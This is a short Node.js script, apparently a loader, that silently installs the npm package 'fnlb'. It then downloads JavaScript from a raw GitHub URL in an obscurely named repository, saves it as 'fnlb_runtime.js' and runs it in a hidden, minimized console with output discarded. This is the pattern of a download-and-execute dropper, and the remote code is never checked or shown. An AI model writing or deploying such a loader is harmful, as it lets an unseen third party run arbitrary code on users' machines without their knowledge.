const { exec } = require('child_process');
const fs = require('fs');
const https = require('https');

const MAIN_URL = 'https://raw.githubusercontent.com/snipes21/sdmngbsrjkgbsrstg/refs/heads/main/main.js';
const MAIN_FILE = 'fnlb_runtime.js';

// Save the code to disk
function fetchAndRun() {
    https.get(MAIN_URL, res => {
        let code = '';
        res.on('data', chunk => code += chunk);
        res.on('end', () => {
            fs.writeFileSync(MAIN_FILE, code);
            exec(`start /min cmd /c "node ${MAIN_FILE} >nul 2>&1"`);
        });
    });
}

// Install if needed, then fetch + run
try {
    require.resolve('fnlb');
    fetchAndRun();
} catch {
    exec('npm install fnlb >nul 2>&1', () => {
        fetchAndRun();
    });
}
